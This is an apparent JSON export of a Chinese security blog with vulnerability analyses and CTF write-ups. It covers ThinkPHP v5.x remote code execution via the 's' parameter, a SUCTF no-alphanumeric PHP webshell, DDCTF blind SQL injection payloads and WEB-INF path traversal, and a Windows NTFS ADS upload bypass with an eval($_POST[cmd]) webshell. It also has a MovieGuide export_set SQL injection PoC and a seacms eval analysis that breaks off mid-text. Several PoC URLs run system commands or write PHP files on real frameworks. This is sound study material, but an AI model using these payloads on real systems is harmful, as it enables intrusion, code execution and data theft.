{"pages":[{"title":"","permalink":"http://blog.0kami.cn/404.html","text":"404"},{"title":"About","permalink":"http://blog.0kami.cn/about/index.html","text":"A web 🐶 &amp;&amp; Code reviewer opens source toolsMonitorClient: A web server local monitor &amp; webshell scan and kill toolMonitorServer: A web server remote monitor &amp; webshell scan and kill tool"},{"title":"Search","permalink":"http://blog.0kami.cn/search/index.html","text":""}],"posts":[{"title":"【Code Analysis】thinkphp v5.x App.php s参数RCE","permalink":"http://blog.0kami.cn/2019/02/05/thinkphp-v5-x-App-php-rce/","text":"概述放假了，对thinkphp的几个RCE做一下分析，记录一下XD thinkphp v5.0.x漏洞相关信息漏洞版本：&lt;= 5.0.22补丁：版本更新 · top-think/framework@4cbc0b5 · GitHub问题点：library/think/App.php 漏洞分析关于thinkphp的url解析方式THINKPHP支持使用PATHINFO的方式来访问具体的模块、类、方法，如index.php/module/controller/action对于不支持PATHINFO的服务器，THINKPHP提供了兼容模式?s=/module/controller/action的方式来访问而这次的漏洞成因就是在于兼容模式处理时存在的问题。首先看 thinkphp/library/think/Request.php的pathinfo函数123456789101112131415161718public function pathinfo()&#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // 判断URL里面是否有兼容模式参数 $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLI模式下 index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // 分析PATHINFO信息 ... $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo;&#125; 当GET请求中带有s参数(config中默认var_pathinfo为s)，将pathinfo设置为s的参数值有了pathinfo值，我们再找到具体的解析url的函数，thinkphp/library/think/Route.php的parseUrl函数123456789101112public static function parseUrl($url, $depr = '/', $autoSearch = false)&#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // 如果有模块/控制器绑定 $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); $route = [null, null, null]; // ...&#125; 其中parseUrl函数的$url为上面拿到的pathinfo，$depr为默认的分割符首先对$url替换分割符为|，再输入到parseUrlPath函数(根据/分割)，该函数对pathinfo进行分割，产生module、controller、action那么现在来看rce的Poc?s=/index/\\think\\app/invokefunction=&gt;[module:index,controller:\\think\\app,action:invokefunction]其中controller=&gt;\\think\\app，是php命名空间的表示方式，\\think\\app实际调用library/think/App.php，后面的action实际调用的App.php中的invokefunction函数 漏洞成因点上面分析了thinkphp的兼容模式是如何处理s参数的，并且处理存在一个问题就是可以伪造controller，导致实际调用为其他的类和函数看一下拿到module、controller、action后系统的处理thinkphp/library/think/App.php 的 module函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // 设置默认过滤机制 $request-&gt;filter($config['default_filter']); ... try &#123; $instance = Loader::controller(// 实例化controller类 $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // 获取当前操作名 $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);// 调用函数&#125; 拿到实例化后的对象和方法，动态调用invokeMethod12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // 静态方法 $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars);// 获取参数内容 这里获取到参数用做method的参数输入 self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; 这里使用bindParams函数从get或post中获取到对应的内容，需要注意的是，做参数嵌入时，需要以函数的参数名为键如invokeFunction的参数为$function、$vars，那么在参数中就需要以function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx即poc的后半部分function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l所以调用链现在变成了 动态调用\\think\\app invokeFunction函数 提供function=call_user_func_array作为invokeFunction动态调用的参数，所以下一步调用call_user_func_array函数 call_user_func_array的参数为system函数，system函数的参数为ls -l，所以这里用了2维数组 所以我们可以发散一下思维，我们其实不单单可以调用\\think\\app这个类，如果其他的类可以任意调用其他函数，或者是调用命令执行函数，同样具有危害性如任意命令执行?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();任意文件写入，生成在index.php同一级目录?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();获取配置信息?s=index/\\think\\config/get&amp;name=database.username thinkphp v5.1.x版本信息版本：&lt;= v5.1.30补丁信息：修正控制器调用 · top-think/framework@802f284 · GitHub漏洞点：thinkphp/library/think/route/dispatch/Module.php 漏洞分析原理同v5.0.x版本类似，也是由于s参数带入的路径解析存在安全问题导致的任意代码执行先看App::run()1234567891011121314151617181920212223242526272829303132333435public function run()&#123; try &#123; // 初始化应用 $this-&gt;initialize(); ... $dispatch = $this-&gt;dispatch; if (empty($dispatch)) &#123; // 路由检测 $dispatch = $this-&gt;routeCheck()-&gt;init();// 处理module、controller、action &#125; // 记录当前调度信息 $this-&gt;request-&gt;dispatch($dispatch); ... &#125; catch (HttpResponseException $exception) &#123; $dispatch = null; $data = $exception-&gt;getResponse(); &#125; $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) &#123; return is_null($data) ? $dispatch-&gt;run() : $data; &#125;); $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// 动态调用controller、action ... return $response;&#125; App::run()函数体现了程序的一个主要流程，从路径的解析到动态解析执行相应的控制器及方法先来看看第13行，获取相应的路径信息thinkphp/library/think/App.php routeCheck()函数1234567891011121314151617181920public function routeCheck()&#123; // 检测路由缓存 ... // 获取应用调度信息 $path = $this-&gt;request-&gt;path(); // 从Request.php path提取urlpath 具体从pathinfo()，优先获取$_GET[$this-&gt;config['var_pathinfo']] // var_pathinfo 默认为s // 是否强制路由模式 $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must'); // 路由检测 返回一个Dispatch对象 $dispatch = $this-&gt;route-&gt;check($path, $must);//返回UrlDispatch类实例，从dispatch类处继承 ... return $dispatch;&#125; 第7行从s参数中获取路由路径(s为var_pathinfo的默认值)，在调用routeCheck函数后返回一个UrlDispatch，之后调用了Url类的init函数thinkphp/library/think/route/dispatch/Url.php init12345678public function init()&#123; // 解析默认的URL规则 $result = $this-&gt;parseUrl($this-&gt;dispatch); // parseUrl函数处理参数值(以/分割，传入|也行会被替换成/，最终由/来分割)，返回[module,controller,action] return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; 返回Module对象，继承自Dispatch对象，并且调用了init函数，将解析后的路由填充到dispatch，供后面App::run()函数动态调用dispatch的run函数，v5.1版本的调用链复杂了一点，但是其实内容同v5.0版本类似Dispatch::run()函数调用了Module::exec()函数thinkphp/library/think/route/dispatch/Module.php exec()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public function exec()&#123; // 监听module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // 实例化控制器 $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); if ($instance instanceof Controller) &#123; $instance-&gt;registerMiddleware(); &#125; &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // 闭包调用 $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // 获取当前操作名 $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // 自动获取请求变量 $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); $vars = array_merge($vars, $this-&gt;param); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; 简单描述exec函数，实例化controller，用于后面20行到55行的闭包函数，这个必报函数主要完成了调用controller的action，并获取输入的参数值，最后由invokeReflectMethod完成主要的调用。最终的调用函数为Request::filterValue函数123456789101112131415161718192021222324252627282930private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // 调用函数或者方法过滤 $value = call_user_func($filter, $value);//调用函数 &#125; elseif (is_scalar($value)) &#123; if (false !== strpos($filter, '/')) &#123; // 正则过滤 if (!preg_match($filter, $value)) &#123; // 匹配不成功返回默认值 $value = $default; break; &#125; &#125; elseif (!empty($filter)) &#123; // filter函数不存在时, 则使用filter_var进行过滤 // filter为非整形值时, 调用filter_id取得过滤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) &#123; $value = $default; break; &#125; &#125; &#125; &#125; return $value;&#125; 到这里其实思路很明显，利用/分割出能利用的controller，并输入相应的参数值，接下来就是找可利用的函数。v5.0版本中poc都能用 如任意命令执行?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();任意文件写入，生成在index.php同一级目录?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();获取配置信息?s=index/\\think\\config/get&amp;name=database.username除此之外，还可以使用\\think\\request/input（v5.0版本不能用是因为think\\request的构造函数为protected，不允许动态调用）如任意代码执行?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfoinvokeFunction核心ReflectionFunction?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1因为think\\app继承自think\\container，所以改成think\\app也行其中call_user_func填充参数时，以数组形式，第一个为函数名，第二个为函数参数call_user_func_array填充参数时，以数组形式，第一个为函数名，第二个为函数参数（也为数组形式）这里v5.1只能用php7，如v5.0还可以使用assert来执行函数 总结这次出的这个漏洞危害很大，整个调用过程也非常漂亮，值得一步一步调试。其中收获大致就是了解了thinkphp v5版本路由调用的流程，v5.1版本的闭包函数构造的方式给框架带来了不一样的感受，不得不给thinkphp一个赞"},{"title":"【CTF】SUCTF 2018 部分web writeup","permalink":"http://blog.0kami.cn/2018/05/28/suctf-part-web-writeup/","text":"SUCTF抽了点时间做了2道SUCTF的web题，记录一下writeup。 Anonymous考点php的动态函数执行，以及create_function所返回的匿名函数 wp访问题目，直接给了源码12345678910$MY = create_function(&quot;&quot;,&quot;some code&quot;); // 执行了cat命令，读取flag内容$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125; 思路比较明确，就是想办法执行create_function所产生的匿名函数。而其中SUCTF_32，这个函数明确是没办法爆破出来的。那么就只能在 $MY 上下功夫。打印一下$MY的值，发现create_function返回了\\0lambda_{number},那么就很明确了，只要暴力一下这个number就有一定几率执行该函数，这里我暴力了大概1000多就有2条执行了 Getshell考点https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html wp 首先确定可用字符，使用bp将所有可见字符暴力一遍后发现可打印字符为$ () [] _ ~ . ; =，以及其他不可打印字符。 根据p牛的博客，发现取反中文可以起到作用，测试~({中文})发现可根据中文的utf-8编码的中间2个hex码进行对字母的遍历http://www.herongyang.com/gb2312_gb/pinyin_32.html 凑出字符assert，_GET，并动态执行。为了凑出上面的字符，我采用逐个反取反bin2hex(~(&#39;a&#39;))获得中文utf-8编码的中间2个，搜表即可找到对应的中文，写一下我的getshell代码 123456789101112131415161718192021222324&lt;?php$_=~(瞎);$__.=$_[[]==[]];$_=~(挟);$__.=$_[[]==[]];$_=~(挟);$__.=$_[[]==[]];$_=~(隙);$__.=$_[[]==[]];$_=~(卸);$__.=$_[[]==[]];$_=~(勋);$__.=$_[[]==[]];$_=~(校);$___.=$_[[]==[]];$_=~(下);$___.=$_[[]==[]];$_=~(纤);$___.=$_[[]==[]];$_=~(嫌);$___.=$_[[]==[]];$___=$$___;$__($___[_]); 上传了shell之后就比较容易了，翻目录即可 12system(&apos;ls /&apos;)system(&apos;cat /Th1s_14_f14g&apos;) 总结记录一下getshell的坑点 eval不是函数，是语句 不用引号，用中文也被php当作是字符串 UTF-8编码 http://www.herongyang.com/gb2312_gb/pinyin_32.html"},{"title":"【CTF】DDCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/","text":"DDCTF 2018 2道WEB Writeup WEB00 数据库的秘密step 1:index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过 step 2:绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payloada%&#39; &amp;&amp; &#39;%&#39;=&#39;%、a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%确定注入存在,想着用union直接提取出来，发现后台还有WAF，没绕过去，但是对于盲注，成功构造出了payloada%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%,发生5秒延迟。（后来想想其实可以用bool型盲注提取数据） step 3:确认了author字段可以注入，但是这道题还有一个问题就是sha1校验，要想写脚本，必须先解决这个问题。研究了一下main.js，发现以类似id=title=date=author=time=的字符串sha1处理后后台校验 step 4:写脚本，主要包括sha1校验和时间盲注，贴一下payload 123456789101112payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# 获取到库名 ddctfpayload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# 获取到表名 message, ctf_key4payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# 获取到列名 ctf_key4:secvalue; message: id,title,author,time,statuspayload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# 获取到flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125; WEB01 专属链接step 1:根据题目提示，题目只跟链接IP有关，所以主要有1234http://116.85.48.102:5050/welcom/uuid #主页 注意到上面有email:3814166715717836733@didichuxing.comhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # 给了提示，只能下载.class,.ks,.ico,.xml文件http://116.85.48.102:5050/news/topFiveNews # 没用http://116.85.48.102:5050//flag/testflag/yourflag #访问报错，但是暴露了控制器路径com.didichuxing.ctf.controller.user.FlagController.java step 2:那么接下来就是猜路径了，在github上找了个springmvc+mybatis的项目,经过测试，发现一下几个文件 ../../WEB-INF/web.xml # 得到WEB-INF/applicationContext.xml，com.didichuxing.ctf.listener.InitListener ../../WEB-INF/applicationContext.xml # 得到classpath:mybatis/config.xml ../../WEB-INF/classes/mybatis/config.xml # 得到mapper/FlagMapper.xml ../../WEB-INF/classes/mapper/FlagMapper.xml # sql语句 ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class ../../WEB-INF/classes/sdl.ks # 密钥文件 ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class step 3:把上述的class文件在线反编译到java，阅读后发现flagController.java 12345678@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123; Flag flag = flagService.getFlagByEmail(email); return &quot;Encrypted flag : &quot; + flag.getFlag(); &#125; 以用户的邮箱来获取加密的flag，邮箱就是首页上的邮箱，然后通过listener.java得到具体的加密过程 12345678910111213String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);byte[] data = cipher.doFinal(flag.getBytes());byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e));flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); 可以看到Email被转化为16进制的形式，所以需要先对邮箱做处理，简单编写代码（后面放上来），得到8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27，以http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27请求后得到加密的flag。 step 4:接下来就是写代码解密flag了，因为密钥文件在手，只需编写程序即可，参考https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa需要注意的是这里用了私钥加密公钥解密。解密后得到flag"},{"title":"【CTF】HITB-XCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/","text":"upload 考点windows平台的一些特性 windows平台特性windows下搜索文件用到的是FindFirstFile，该函数执行时，会将&quot;&lt;&quot; =&gt; &quot;*&quot;、&quot;&gt;&quot; =&gt; &quot;?&quot;、&quot; =&gt; .，所以在应用中，我们可以使用这个特性。e.g. `?filename=a&gt; =&gt; a?` 匹配单个字符 `?filename=a&lt; =&gt; a*` 匹配多个字符 `?filename=a&quot; =&gt; a.` NTFS ADS特性 上传的文件名 系统结果 test.php:a.jpg 生成test.php，但是无内容 test.php::$DATA 生成test.php，有内容 test.php::$INDEX_ALLOCATION 生成test.php文件夹 test.php::$DATA.jpg 生成0.jpg，有内容 test.php::$DATA\\test.jpg 生成aaa.jpg，有内容 过程 step 1:功能点#文件上传 #上传文件宽高 =&gt; getshell环境：IIS7.0 Windows Server 2008 Standard Edition Service Pack 2 step 2:文件上传功能黑名单php，文件名前缀时间戳重写，但截取上传文件名的最后一个后缀不变。简单利用ADS特性，上传test.php::$DATA step 3:上传了文件后，需要找到文件目录。pic.php返回了上传文件宽和高，猜测其使用了getimagesize，想到前段时间的一篇帖子，写个脚本跑该复杂目录 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2018/4/11import requestsstr=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;ret=&quot;&quot;for i in range(32): for c in str: t=ret+c url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot; r=requests.get(url) if &quot;width&quot; in r.content: ret+=c print ret break 得到目录87194f13726af7cee27ba2cfe97b60df step 4:有了目录就能访问上传的一句话&lt;?php eval($_POST[cmd]);?&gt;，系统禁用了执行系统命令的一些函数，但是这里并不需要执行命令。这里不截图了cmd=var_dump(glob(&quot;../*&quot;));得到flag.php，访问后发现需要读取flag.php的内容cmd=echo readfile(&quot;../flag.php&quot;);得到flag 总结这次就做了一道web，还有待提高和积累:)"},{"title":"【Code Analysis】MovieGuide v2.0 SQLi","permalink":"http://blog.0kami.cn/2018/02/03/MovieGuide2SQLi/","text":"0x00Detail: Movie Guide v2.0 SQL Injection 0x01这是一个比较粗糙的开源cms，总体来说并没有对输入输出做安全处理，从PoC入手，选一个还原一下漏洞形成过程。 PoC：index.php?md=[SQL]定位一下md参数layout.php为该cms的主要入口处理,下述的变量均没有通过安全处理，直接SQL语句，从而都可以用于数据库注入。12345678//Get the passed variables.$mterm = filter_input(INPUT_POST, 'tterm');$cterm = filter_input(INPUT_POST, 'gterm');$lterm = filter_input(INPUT_GET, 'gterm');$yterm = filter_input(INPUT_GET, 'year');$md = filter_input(INPUT_GET, 'md');$actorname = filter_input(INPUT_GET, 'actor');$directorname = filter_input(INPUT_GET, 'director'); 直接拼接入SQL语句1$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;; 这里比较有意思的是它的PoC，以前没有见过类似的:b，PoC中使用了export_set函数 EXPORT_SET(bits,on,off[,separator[,number_of_bits]])Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of −1 is effectively the same as 64. 分解一下PoC123456789101112131415/*!02222UNION*/( /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239, ( /*!02222Select*/ export_set(5,@a:=0, (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a export_set(5, export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name] ,/*!02222column_name*/,&apos;\\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name] ) ,@a,2)//set @a split char ) ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239 )-- - 这里主要利用的是export_set函数的no，off位置来dump数据。 首先通过@a:=0，定义变量a为0（可能跟mysql版本有关系，5.7.x下的mysql无法用@:=0来定义） 最里面的export_set，将table_name dump出来（结果为0&lt;li&gt;table_name） 接下来的一个export_set，将columns_name dump出来(结果为0&lt;li&gt;table_name\\n:columns_name) select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\\n:&#39;,2)将上述的数据赋值给变量a 最后用最后一个export_set，用@a做分隔符，将数据dump出来 0x02 总结该cms的注入漏洞很常规，主要是学习分析了该PoC，能在未来注入绕过的地方应用。 mysql的自定义变量@的应用，可以在一定程度上消除空格，以及正则\\bwhere\\b的绕过 /!02222select*/这个方法也是经常听说，也在这里用到了，一个很好的例子。 export_set的应用，比较重要的应用，在某些情况下可用于绕过"},{"title":"【Code Review】seacms v6.5 前台getshell","permalink":"http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/","text":"概述前段时间放在90sec上的一篇代码审计，收拾一下放到自己博客上 分析cms版本：6.45直接上代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function parseIf($content)&#123; if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;); $labelRule2=&quot;&#123;elseif&quot;; $labelRule3=&quot;&#123;else&#125;&quot;; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; echo &quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;; eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;&quot;); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(&quot;if($strIf)&#123;\\$resultStr=\\&quot;$elseIfArraystr0\\&quot;;&#125;&quot;); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen\\&quot;;&#125;&quot;); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;&quot;); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0); @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen0\\&quot;;\\$elseIfFlag=true;&#125;&quot;); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; 上面主要逻辑为解析html文件中的{if:}{end 